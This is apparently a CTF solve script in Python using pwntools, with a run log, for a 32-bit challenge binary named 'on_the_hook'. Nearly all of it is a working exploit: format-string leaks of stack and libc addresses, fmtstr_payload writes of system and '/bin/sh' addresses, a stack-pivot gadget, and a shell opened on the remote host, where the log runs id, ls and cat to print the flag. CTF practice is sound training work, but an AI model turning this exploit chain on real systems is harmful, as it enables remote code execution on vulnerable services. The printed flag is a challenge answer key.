from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './on_the_hook'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "ctf.k3rn3l4rmy.com"
  PORT = 2201
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
  stack_pivot = 0x00076991 # add esp, 0x100; ret;  
else:
  s = process(BINARY)
  libc = elf.libc
  stack_pivot = 0x00076a71 # add esp, 0x100; ret; 
  #s = process(BINARY, env={'LD_PRELOAD': './libc.so.6'})
  #libc = ELF("./libc.so.6")
  #stack_pivot = 0x00076991 # add esp, 0x100; ret;  

index = 7

# Lead stack address
s.sendline("%21$p")
s.recvuntil("echo:\n")
stack_leak  = int(s.recvuntil('\n'), 16)
target_addr = stack_leak - 0x118
print("stack_leak  =", hex(stack_leak))
print("target_addr =", hex(target_addr))

# Leak libc address
s.sendline(p32(elf.got.setvbuf) + b"%7$s")
s.recv(4)
setvbuf     = u32(s.recv(4))
libc_base   = setvbuf - libc.sym.setvbuf
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

print("setvbuf     =", hex(setvbuf))
print("libc_base   =", hex(libc_base))

# Write system_address in stack
writes = {target_addr + 0x104: system_addr}
buf = fmtstr_payload(index, writes, write_size='short')
s.sendline(buf)

# Write /bin/sh address in stack
writes = {target_addr + 0x10c: binsh_addr}
buf = fmtstr_payload(index, writes, write_size='short')
s.sendline(buf)

# Stack pivot(add esp, 0x100; ret;) and Start /bin/sh
writes = {target_addr: libc_base + stack_pivot}
buf = fmtstr_payload(index, writes, write_size='short')
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/K3RN3LCTF/Pwn_on_the_hook$ python3 solve.py r
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_on_the_hook/on_the_hook'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to ctf.k3rn3l4rmy.com on port 2201: Done
[*] '/home/mito/CTF/K3RN3LCTF/Pwn_on_the_hook/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline("%21$p")
solve.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.recvuntil("echo:\n")
solve.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  stack_leak  = int(s.recvuntil('\n'), 16)
stack_leak  = 0xff825894
target_addr = 0xff82577c
setvbuf     = 0xf7e24360
libc_base   = 0xf7dc4000
[*] Paused (press any to continue)
[*] Switching to interactive mode
...
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 1920
-rw-rw-r-- 1 nobody nogroup      46 Nov 11 02:58 flag.txt
-rwxrwxr-x 1 nobody nogroup  147688 Nov 11 02:58 ld-2.23.so
-rwxrwxr-x 1 nobody nogroup 1786484 Nov 11 02:58 libc.so.6
-rwxrwxr-x 1 nobody nogroup   19672 Nov 11 22:59 run
$ cat flag.txt
flag{m4l1oc_h0ok_4nd_0n3_g4d9et_3a5y_a5_7h4t}
'''

